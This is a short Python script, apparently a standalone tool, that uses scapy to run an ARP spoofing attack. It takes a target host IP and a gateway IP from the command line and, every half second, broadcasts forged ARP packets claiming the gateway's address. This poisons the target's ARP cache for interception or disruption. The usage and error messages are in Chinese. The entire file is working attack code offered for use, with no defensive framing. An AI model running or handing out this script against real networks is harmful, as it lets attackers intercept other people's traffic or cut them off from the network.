from scapy.all import *
import time
import sys

def arp_spoof(ip1,ip2):
    try:
        pkt=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip1,psrc=ip2)
        send(pkt)
    except:
        print("发送失败")

def main():
    if len(sys.argv) != 3:
        print('使用方法：python ARP起便脚本 目标主机ip 网关ip')
        sys.exit()

    ip1=str(sys.argv[1].strip())
    ip2 =str(sys.argv[2].strip())

    while True:
        arp_spoof(ip1,ip2) 
        time.sleep(0.5)

if __name__ == "__main__":
    main()